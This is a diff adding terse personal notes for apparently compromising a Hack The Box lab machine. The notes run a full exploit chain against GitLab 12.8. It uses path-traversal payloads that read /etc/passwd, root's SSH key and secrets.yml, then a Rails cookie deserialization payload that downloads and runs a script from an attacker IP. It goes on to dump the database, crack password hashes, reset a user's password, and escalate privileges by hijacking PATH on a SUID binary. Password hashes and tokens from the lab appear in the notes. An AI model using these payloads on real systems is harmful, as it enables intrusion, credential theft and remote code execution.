@@ -1,0 +1,100 @@
+nmap -sTVC  10.129.52.12  -Pn
+found git.lab and create account
+gobuster dir -k -u https://git.laboratory.htb/  -w /usr/share/dirb/wordlists/common.txt
+
+https://hackerone.com/reports/827052
+
+Create two projects
+Add an issue with the following description:
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/ssh/sshd_config)
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/ssh/ssh_config)
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../root/.ssh/id_rsa)
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../var/log/auth.log)
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/httpd/conf/httpd.conf)
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../usr/bin/htpasswd)
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/httpd)
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/apache2/mods-available/passenger.conf)
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
+
+
+Move the issue to the second project
+The file will have been copied to the project
+
+get the secret_key_base from secret.yml
+download docker and run same version 12.8 gitlab
+change secrets.yml secret_key_base and restart gitlab
+
+use rails console generate cookie
+/opt/gitlab/bin/gitlab-rails console
+
+erb = ERB.new("<% `wget -O /tmp/titanium.sh http://10.10.14.158:80/titanium.sh; chmod +x /tmp/titanium.sh; /tmp/titanium.sh` %>")
+
+##########
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
+
+erb = ERB.new("<% `wget -O /tmp/titanium.sh http://10.10.14.158:80/titanium.sh; chmod +x /tmp/titanium.sh; /tmp/titanium.sh` %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
+##########
+
+
+
+do python -m SimpleHTTPServer 80
+
+curl -vvv 'https://git.laboratory.htb/users/sign_in' -k -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAZIjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7ICBgd2dldCAtTyAvdG1wL3RpdGFuaXVtLnNoIGh0dHA6Ly8xMC4xMC4xNC4xNTg6ODAvdGl0YW5pdW0uc2g7IGNobW9kICt4IC90bXAvdGl0YW5pdW0uc2g7IC90bXAvdGl0YW5pdW0uc2hgIDsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--1964ec6f292058e25ff8629e441171e502a749b5"
+
+
+
+
+
+
+###get in to postgredb
+gitlab-rails dbconsole
+
+select * from namespaces;
+select * from projects;
+SecureDocker ;G0SICMmeuXns2NieK9C8kIfgOK3uPiLzneF/vZLPSMUWhPIB
+SecureWebsite;GX6QZfik8Dnd3uDMN4qMg/jwHqSTABRcsKugP49KYQ7uQPSv
+
+\list
+\dt
+\d users
+select user,name,encrypted_password,reset_password_token, reset_password_sent_at from user;
+
+Seven            | $2a$10$HkBO3A4k6G42X85r0ZIpO.RlSLCg9igEaiiU8r44Ymd7e2nWcjixC
+Dexter McPherson | $2a$10$YqNpT9IdQm9tlE3SS/uYWOsrH1Fblb/jiM62XVB.WzDLTJNoC0/im
+
+
+hashcat -m 3200 Seven.txt /home/qoo7972365/Desktop/rockyou.txt
+hashcat -m 3200 Dexter McPherson.txt /home/qoo7972365/Desktop/rockyou.txt
+
+
+
+#### use rails console reset passowrd
+gitlab-rails console -e production
+
+
+
+user = User.where(id: 1).first
+user.password = 'secret_pass'
+user.password_confirmation = 'secret_pass'
+user.save!
+
+
+reset dexter passowrd and login find private_key
+ssh -i id_rsa dexter@laboratory.htb
+
+find / -perm -u=s -type f 2>/dev/null
+
+
+sudo scp -i id_rsa dexter@laboratory.htb:/usr/local/bin/docker-security /home/qoo7972365/PycharmProjects/kali/laboratory/docker-security
+
+strings docker-security    find chmod function
+echo /bin/sh  > /tmp/chmod
+chmod 777 chmod
+export PATH=/tmp:$PATH
+/usr/local/bin/docker-security
